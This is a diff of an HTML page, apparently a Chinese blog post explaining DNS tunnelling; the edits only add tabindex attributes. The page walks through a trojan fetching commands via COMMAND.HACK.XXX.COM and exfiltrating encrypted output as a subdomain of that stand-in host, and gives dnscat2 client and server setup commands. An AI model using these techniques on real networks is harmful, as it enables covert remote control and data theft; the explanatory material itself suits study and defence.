@@ -119,12 +119,12 @@ DNS 隧道是隐蔽的、可加密的数据传输隧道，基于 UDP 协议，�
 <p>例如服务端:<code>set command=ipcofig</code></p>
 <p>客户端:请求 <code>COMMAND.HACK.XXX.COM</code>，得到解析结果ipconfig</p>
 <p>操作系统执行后，返回结果一般如下:</p>
-<pre><code>WINDOWS IP Configuration:
+<pre tabindex="0"><code>WINDOWS IP Configuration:
 ......
 </code></pre><p>此时木马将 WINDOWS IP Configuration 进行编码加密，可能是如下形式:</p>
-<pre><code>U2FsdGVkX19cMV2s858WNyKHm5mRXx4VXng1nK8bFG5XKQSaO52vXKIsX0IZ1pxyCdI
+<pre tabindex="0"><code>U2FsdGVkX19cMV2s858WNyKHm5mRXx4VXng1nK8bFG5XKQSaO52vXKIsX0IZ1pxyCdI
 </code></pre><p>然后拼接成域名为:</p>
-<pre><code>U2FsdGVkX19cMV2s858WNyKHm5mRXx4VXng1nK8bFG5XKQSaO52vXKIsX0IZ1pxyCdI.H ACK.XXX.COM
+<pre tabindex="0"><code>U2FsdGVkX19cMV2s858WNyKHm5mRXx4VXng1nK8bFG5XKQSaO52vXKIsX0IZ1pxyCdI.H ACK.XXX.COM
 </code></pre><p>服务端接收后，会使用密钥解密这串字符，得到命令执行结果。</p>
 <p>这样反复的过程就能达到永久控制客户端的目的。</p>
 <h2 id="0x03-如何判断是否能够建立隧道">0x03 如何判断是否能够建立隧道?</h2>
@@ -143,12 +143,12 @@ DNS 隧道是隐蔽的、可加密的数据传输隧道，基于 UDP 协议，�
 <p><strong>dnscat2分为客户端和服务端</strong></p>
 </blockquote>
 <p>客户端配置：</p>
-<pre><code>$ git clone https://github.com/iagox86/dnscat2.git
+<pre tabindex="0"><code>$ git clone https://github.com/iagox86/dnscat2.git
 $ cd dnscat2/client/
 $ make
 $ dnscat &lt;Domain&gt;
 </code></pre><p>服务端配置（需要Ruby环境）：</p>
-<pre><code>$ git clone https://github.com/iagox86/dnscat2.git
+<pre tabindex="0"><code>$ git clone https://github.com/iagox86/dnscat2.git
 $ cd dnscat2/server/
 $ gem install bundler
 $ bundle install
@@ -176,9 +176,9 @@ $ ./dnscat2 --dns server=x.x.x.x,port=53
 </tr>
 </tbody>
 </table>
-<pre><code># 服务器(1.1.1.1)
+<pre tabindex="0"><code># 服务器(1.1.1.1)
 root@payloads:~# tcpdump udp port 53
-</code></pre><pre><code># 客户端
+</code></pre><pre tabindex="0"><code># 客户端
 nslookup hello.dns.payloads.online
 </code></pre>
 </div>
